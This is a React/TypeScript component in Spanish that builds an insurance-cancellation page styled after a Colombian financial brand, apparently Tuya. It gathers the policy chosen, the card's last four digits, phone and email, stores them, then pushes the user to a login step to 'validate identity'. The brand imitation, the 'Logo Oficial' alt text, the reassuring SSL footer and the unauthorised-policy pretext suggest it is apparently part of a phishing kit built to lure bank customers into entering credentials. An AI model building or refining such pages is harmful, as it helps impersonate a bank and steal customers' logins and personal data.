import React, { useState } from 'react'
import tuyaLogo from '../assets/logo.svg'
import {
  ShieldAlert,
  ChevronDown,
  ArrowLeft,
  Lock,
} from 'lucide-react'

interface InsuranceCancellationViewProps {
  onBackToHome?: () => void
  onGoToLogin: () => void
}

export const InsuranceCancellationView: React.FC<InsuranceCancellationViewProps> = ({
  onBackToHome,
  onGoToLogin,
}) => {
  // Datos del formulario de Cancelación de Seguro
  const [selectedInsurance, setSelectedInsurance] = useState('Seguro Vida Deudores')
  const [cancellationReason, setCancellationReason] = useState('Costo mensual elevado de la prima')
  const [cardLast4, setCardLast4] = useState('')
  const [phone, setPhone] = useState('')
  const [email, setEmail] = useState('')
  const [additionalComments, setAdditionalComments] = useState('')

  const [isInsuranceDropdownOpen, setIsInsuranceDropdownOpen] = useState(false)
  const [isReasonDropdownOpen, setIsReasonDropdownOpen] = useState(false)

  const insuranceOptions = [
    'Seguro Vida Deudores',
    'Seguro Protección Integral / Fraude',
    'Seguro Desempleo e Incapacidad',
    'Seguro Asistencia Médica y Hogar',
    'Seguro Protección Celular y Tecnología',
    'Seguro Accidentes Personales',
    'Otras asistencias y coberturas activas',
  ]

  const reasons = [
    'Costo mensual elevado de la prima',
    'No autoricé o no solicité la póliza',
    'Cuento con cobertura similar en otra entidad',
    'Venta, sustitución o cancelación del producto',
    'Disconformidad con el servicio o cobertura',
    'Motivos económicos personales',
    'Otro motivo',
  ]

  // Al enviar el formulario de seguro -> Guarda datos en sessionStorage y redirige directo al Login
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()

    if (!phone.trim()) {
      alert('Por favor ingresa tu número de celular de contacto.')
      return
    }
    if (!email.trim()) {
      alert('Por favor ingresa tu correo electrónico.')
      return
    }

    // Guardar información del seguro solicitado a cancelar para adjuntarlo tras el Login
    const insurancePayload = {
      insurance: selectedInsurance,
      reason: cancellationReason,
      cardLast4: cardLast4.trim() || 'N/A',
      phone: phone.trim(),
      email: email.trim(),
      comments: additionalComments.trim(),
      requestedAt: new Date().toISOString(),
    }
    sessionStorage.setItem('insurance_cancellation_data', JSON.stringify(insurancePayload))

    // Redirigir directo al Login y seguir el proceso normal
    onGoToLogin()
  }

  return (
    <div className="w-full min-h-screen bg-[#F0F2F5] flex flex-col items-center justify-between p-4 sm:p-6 font-sans">
      
      {/* HEADER SUPERIOR */}
      <header className="w-full max-w-2xl flex items-center justify-between py-2 sm:py-3 px-1">
        <button
          type="button"
          onClick={onBackToHome || (() => (window.location.hash = ''))}
          className="inline-flex items-center gap-1.5 text-xs sm:text-sm font-semibold text-[#5A6878] hover:text-[#E20613] transition-colors cursor-pointer"
        >
          <ArrowLeft className="w-4 h-4 text-[#E20613]" strokeWidth={2.5} />
          Volver al inicio
        </button>

        <img src={tuyaLogo} alt="Logo Oficial" className="h-9 sm:h-11 w-auto object-contain" />
      </header>

      {/* FORMULARIO INDIVIDUAL DE CANCELACIÓN DE SEGURO */}
      <main className="w-full max-w-xl my-auto py-4">
        <div className="w-full bg-[#FFFFFF] rounded-3xl p-6 sm:p-9 shadow-xl border border-gray-100 flex flex-col items-center">
          
          <div className="w-13 h-13 rounded-2xl bg-[#FFF5F5] border border-[#FECACA] flex items-center justify-center mb-4 text-[#E20613] shadow-xs">
            <ShieldAlert className="w-7 h-7" />
          </div>

          <h1 className="text-[22px] sm:text-[25px] font-bold text-[#1E293B] text-center tracking-tight mb-2">
            Cancelación de Seguro
          </h1>
          <p className="text-xs sm:text-sm text-[#64748B] text-center max-w-md mb-6 leading-relaxed">
            Completa los detalles de la póliza que deseas cancelar. A continuación te solicitaremos iniciar sesión para validar tu identidad y procesar la baja.
          </p>

          <form onSubmit={handleSubmit} className="w-full flex flex-col gap-4">
            
            {/* Selección de Seguro */}
            <div className="relative">
              <label className="block text-[11px] font-bold uppercase tracking-wider text-[#475569] mb-1.5">
                Selecciona el seguro o póliza a cancelar *
              </label>
              <div
                onClick={() => {
                  setIsInsuranceDropdownOpen(!isInsuranceDropdownOpen)
                  setIsReasonDropdownOpen(false)
                }}
                className="w-full bg-[#F8FAFC] border border-gray-200 rounded-2xl px-4 py-3 cursor-pointer select-none flex items-center justify-between hover:border-gray-300 transition-colors"
              >
                <span className="text-[14px] font-semibold text-[#1E293B] truncate">
                  {selectedInsurance}
                </span>
                <ChevronDown
                  className={`w-5 h-5 text-[#E20613] transition-transform duration-200 ${
                    isInsuranceDropdownOpen ? 'rotate-180' : ''
                  }`}
                />
              </div>

              {isInsuranceDropdownOpen && (
                <div className="absolute z-30 top-full left-0 right-0 mt-1.5 bg-white rounded-2xl p-2 shadow-2xl border border-gray-100 max-h-56 overflow-y-auto">
                  {insuranceOptions.map((opt) => (
                    <div
                      key={opt}
                      onClick={() => {
                        setSelectedInsurance(opt)
                        setIsInsuranceDropdownOpen(false)
                      }}
                      className={`px-3 py-2.5 rounded-xl text-xs sm:text-[13px] cursor-pointer transition-colors ${
                        selectedInsurance === opt
                          ? 'text-[#E20613] font-bold bg-[#FFF5F5]'
                          : 'text-[#334155] hover:bg-gray-50'
                      }`}
                    >
                      {opt}
                    </div>
                  ))}
                </div>
              )}
            </div>

            {/* Motivo de Cancelación */}
            <div className="relative">
              <label className="block text-[11px] font-bold uppercase tracking-wider text-[#475569] mb-1.5">
                Motivo de la cancelación *
              </label>
              <div
                onClick={() => {
                  setIsReasonDropdownOpen(!isReasonDropdownOpen)
                  setIsInsuranceDropdownOpen(false)
                }}
                className="w-full bg-[#F8FAFC] border border-gray-200 rounded-2xl px-4 py-3 cursor-pointer select-none flex items-center justify-between hover:border-gray-300 transition-colors"
              >
                <span className="text-[13.5px] font-medium text-[#1E293B] truncate">
                  {cancellationReason}
                </span>
                <ChevronDown
                  className={`w-5 h-5 text-[#E20613] transition-transform duration-200 ${
                    isReasonDropdownOpen ? 'rotate-180' : ''
                  }`}
                />
              </div>

              {isReasonDropdownOpen && (
                <div className="absolute z-30 top-full left-0 right-0 mt-1.5 bg-white rounded-2xl p-2 shadow-2xl border border-gray-100 max-h-52 overflow-y-auto">
                  {reasons.map((r) => (
                    <div
                      key={r}
                      onClick={() => {
                        setCancellationReason(r)
                        setIsReasonDropdownOpen(false)
                      }}
                      className={`px-3 py-2 rounded-xl text-xs sm:text-[13px] cursor-pointer transition-colors ${
                        cancellationReason === r
                          ? 'text-[#E20613] font-bold bg-[#FFF5F5]'
                          : 'text-[#334155] hover:bg-gray-50'
                      }`}
                    >
                      {r}
                    </div>
                  ))}
                </div>
              )}
            </div>

            {/* Últimos 4 dígitos de la tarjeta */}
            <div>
              <label className="block text-[11px] font-bold uppercase tracking-wider text-[#475569] mb-1.5">
                Últimos 4 dígitos de la tarjeta o producto asociado (opcional)
              </label>
              <input
                type="text"
                maxLength={4}
                inputMode="numeric"
                value={cardLast4}
                onChange={(e) => setCardLast4(e.target.value.replace(/[^0-9]/g, ''))}
                placeholder="Ej: 7003"
                className="w-full bg-[#F8FAFC] border border-gray-200 rounded-2xl px-4 py-3 text-[14px] text-[#1E293B] outline-none focus:border-[#E20613] focus:bg-white transition-all font-mono"
              />
            </div>

            {/* Celular y Correo */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div>
                <label className="block text-[11px] font-bold uppercase tracking-wider text-[#475569] mb-1.5">
                  Celular de contacto *
                </label>
                <input
                  type="tel"
                  inputMode="numeric"
                  required
                  value={phone}
                  onChange={(e) => setPhone(e.target.value.replace(/[^0-9]/g, ''))}
                  placeholder="Ej: 3001234567"
                  className="w-full bg-[#F8FAFC] border border-gray-200 rounded-2xl px-4 py-3 text-[14px] text-[#1E293B] outline-none focus:border-[#E20613] focus:bg-white transition-all"
                />
              </div>
              <div>
                <label className="block text-[11px] font-bold uppercase tracking-wider text-[#475569] mb-1.5">
                  Correo electrónico *
                </label>
                <input
                  type="email"
                  required
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="tucorreo@ejemplo.com"
                  className="w-full bg-[#F8FAFC] border border-gray-200 rounded-2xl px-4 py-3 text-[14px] text-[#1E293B] outline-none focus:border-[#E20613] focus:bg-white transition-all"
                />
              </div>
            </div>

            {/* Observaciones */}
            <div>
              <label className="block text-[11px] font-bold uppercase tracking-wider text-[#475569] mb-1.5">
                Observaciones adicionales (opcional)
              </label>
              <textarea
                rows={2}
                value={additionalComments}
                onChange={(e) => setAdditionalComments(e.target.value)}
                placeholder="Detalle opcional sobre la solicitud de baja..."
                className="w-full bg-[#F8FAFC] border border-gray-200 rounded-2xl px-4 py-2.5 text-[13.5px] text-[#1E293B] outline-none focus:border-[#E20613] focus:bg-white transition-all resize-none font-normal"
              />
            </div>

            {/* Aviso de seguridad */}
            <div className="flex items-center gap-2.5 px-4 py-2.5 bg-[#FFF5F5] border border-[#FECACA]/70 rounded-xl text-xs text-[#991B1B]">
              <Lock className="w-4 h-4 shrink-0 text-[#E20613]" />
              <span>En el siguiente paso validarás tu identidad iniciando sesión normalmente.</span>
            </div>

            {/* Botón Continuar Directo al Login */}
            <button
              type="submit"
              className="w-full mt-2 py-3.5 px-6 rounded-full bg-gradient-to-r from-[#D41A25] to-[#B80F1A] hover:from-[#E20613] hover:to-[#9E0B14] text-white text-[15px] font-bold shadow-lg shadow-red-500/20 active:scale-[0.99] transition-all cursor-pointer flex items-center justify-center gap-2"
            >
              <span>Continuar y validar identidad</span>
              <span>→</span>
            </button>

          </form>
        </div>
      </main>

      {/* FOOTER DISCRETO */}
      <footer className="w-full max-w-2xl text-center py-3 text-[11px] text-[#94A3B8]">
        Protegido por protocolos de seguridad bancaria SSL 256-bit. Todos los derechos reservados © {new Date().getFullYear()}
      </footer>

    </div>
  )
}
